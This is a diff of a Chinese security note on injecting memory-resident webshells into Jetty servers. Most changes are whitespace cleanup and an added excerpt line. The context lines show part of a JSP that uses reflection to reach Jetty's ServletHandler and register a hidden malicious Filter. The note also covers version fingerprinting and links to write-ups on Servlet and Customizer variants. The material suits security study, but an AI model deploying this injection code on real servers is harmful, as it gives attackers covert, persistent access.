@@ -6,6 +6,7 @@ category:
 tags:
   - 内存马
   - Jetty
+excerpt: Jetty Web 服务器上注入内存马的思路与实践，涵盖版本探测与利用方式。
 ---
 
 # Jetty内存马
@@ -21,7 +22,6 @@ Jetty 是一种现代的完全异步 Web 服务器，作为面向组件的技术
 ### 查看版本号
 
 - Web侧的话
-
   - 响应标头中可能会有 Jetty 版本信息, 例如:
 
     ![image-20240918162938756](http://cdn.ayusummer233.top/DailyNotes/202409181629820.png)
@@ -31,7 +31,6 @@ Jetty 是一种现代的完全异步 Web 服务器，作为面向组件的技术
     ![image-20240918163003019](http://cdn.ayusummer233.top/DailyNotes/202409181630064.png)
 
 - 主机侧的话
-
   - 可以在 JavaWeb 项目的 `pom.xml` 中看到 jetty 的版本号
 
     ![image-20240918162309589](http://cdn.ayusummer233.top/DailyNotes/202409181623686.png)
@@ -129,11 +128,11 @@ Jetty 9.2.x 提供了更加安全且可维护的方式来处理 `Servlet` 的动
                 Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                 fieldContext.setAccessible(true);
                 Object webAppContext = fieldContext.get(threadClassLoader);
-                
+
                 // 打印调试信息
                 out.println("webAppContext class: " + webAppContext.getClass().getName() + "<br>");
                 out.println("webAppContext superclass: " + webAppContext.getClass().getSuperclass().getName() + "<br>");
-                
+
                 try {
                     // 获取 _servletHandler 字段
                     Field fieldServletHandler = webAppContext.getClass().getSuperclass().getSuperclass().getDeclaredField("_servletHandler");
@@ -172,7 +171,7 @@ Jetty 9.2.x 提供了更加安全且可维护的方式来处理 `Servlet` 的动
                         Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                         holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                     }
-                    holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);               
+                    holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);
                     holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
                     servletHandler.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandler, holder);
 
@@ -187,7 +186,7 @@ Jetty 9.2.x 提供了更加安全且可维护的方式来处理 `Servlet` 的动
                 } catch (NoSuchFieldException e) {
                     out.println("Error: " + e.getMessage() + "<br>");
                 }
-            }     
+            }
         }
     }
 %>
@@ -205,15 +204,8 @@ Jetty 9.2.x 提供了更加安全且可维护的方式来处理 `Servlet` 的动
 
 > [Java利用技巧——Jetty Servlet型内存马 (3gstudent.github.io)](https://3gstudent.github.io/Java利用技巧-Jetty-Servlet型内存马)
 
-
-
-
-
 ---
 
 ## Customizer型内存马
 
 > [一种在高版本JDK下 的新型嵌入式Jetty Customizer内存马实现 - 白帽酱の博客 (rce.moe)](https://rce.moe/2023/08/19/Jetty-Customize-memory-webshell/)
-
-
-
